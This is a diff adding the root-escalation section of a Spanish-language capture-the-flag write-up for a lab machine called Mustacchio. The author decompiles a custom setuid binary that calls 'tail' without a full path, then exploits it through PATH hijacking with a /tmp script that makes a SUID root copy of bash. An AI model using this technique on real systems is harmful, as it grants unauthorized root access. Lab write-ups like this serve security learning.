@@ -288,3 +288,117 @@ barry@mustacchio:~$ cat user.txt
 62d**********************b831
 
 Ahora queda escalar privilegios.
+Pruebo un sudo -l, pero esta bloqueado.
+
+barry@mustacchio:~$ sudo -l
+sudo: unable to resolve host mustacchio: Connection refused
+[sudo] password for barry: 
+Sorry, try again.
+
+Uso el siguiente comando para buscar binarios que pueda ejecutar como root.
+find / -perm -4000 2>/dev/null
+
+barry@mustacchio:~$ find / -perm -4000 2>/dev/null
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/snapd/snap-confine
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/at
+/usr/bin/chsh
+/usr/bin/newgidmap
+/usr/bin/sudo
+/usr/bin/newuidmap
+/usr/bin/gpasswd
+/home/joe/live_log
+/bin/ping
+/bin/ping6
+/bin/umount
+/bin/mount
+/bin/fusermount
+/bin/su
+
+Vale, hay algo que resalta. /home/joe/live_log.
+Veo sus contenidos.
+
+
+barry@mustacchio:/home/joe$ file live_log 
+live_log: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6c03a68094c63347aeb02281a45518964ad12abe, for GNU/Linux 3.2.0, not stripped
+barry@mustacchio:/home/joe$ python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 ...
+
+me descargo el binario para ver que hace.
+
+El puerto en el que abro el servidor de python esta filtrado, asique me lo acabo bajando con scp.
+~/.ssh$ scp -i id_rsa barry@10.129.181.134:/home/joe/live_log .
+Enter passphrase for key 'id_rsa': 
+live_log                                                                       100%   16KB 173.0KB/s   00:00  
+
+
+La analizo con ghidra y me da el siguiente codigo.
+
+
+void main(void)
+
+{
+  setuid(0);
+  setgid(0);
+  printf("Live Nginx Log Reader");
+  system("tail -f /var/log/nginx/access.log");
+  return;
+}
+
+No esta usando la ruta absoluta de tail. Si genero un binario en la misma carpeta puedo ejecutar codigo.
+
+barry@mustacchio:/home/joe$ touch tail
+touch: cannot touch 'tail': Permission denied
+barry@mustacchio:/home/joe$ nano tail
+
+No tengo permisos de escritura para crear el "binario".
+
+En bash_history no hay nada, y joe no tiene.
+Me he puesto a buscar en varios directorios pero no he encontrado nada.
+
+He vuelto a la idea de path hijacking. Si no tengo permisos para crear un archivo tail, en el /home de joe, lo puedo crear en otro sitio.
+
+Lo he creado en /tmp.
+
+barry@mustacchio:/tmp$ cat tail 
+#!/bin/bash
+cp /bin/bash /tmp/bash
+chmod +s /tmp/bash
+
+Exporto el path y le doy permisos de ejecucion.
+
+barry@mustacchio:/tmp$ export PATH=/tmp:$PATH
+barry@mustacchio:/tmp$ chmod +x /tmp/tail
+
+Ejecuto live_log
+barry@mustacchio:/tmp$ /home/joe/live_log 
+
+barry@mustacchio:/tmp$ ls -la
+total 1048
+drwxrwxrwt  7 root  root     4096 Jun 25 11:10 .
+drwxr-xr-x 24 root  root     4096 Jun 25 09:54 ..
+-rwsr-sr-x  1 root  root  1037528 Jun 25 11:10 bash
+drwxrwxrwt  2 root  root     4096 Jun 25 09:53 .font-unix
+drwxrwxrwt  2 root  root     4096 Jun 25 09:53 .ICE-unix
+-rwxrwxr-x  1 barry barry      54 Jun 25 11:08 tail
+
+Y bash ahora tiene suid de root.
+
+barry@mustacchio:/tmp$ /tmp/bash -p
+bash-4.3# 
+Y el # me confirma que soy root.
+
+Y ya solo queda conseguir la segunda flag.
+bash-4.3# cd /root/
+bash-4.3# ls
+root.txt
+bash-4.3# cat root.txt 
+3223***************93a5
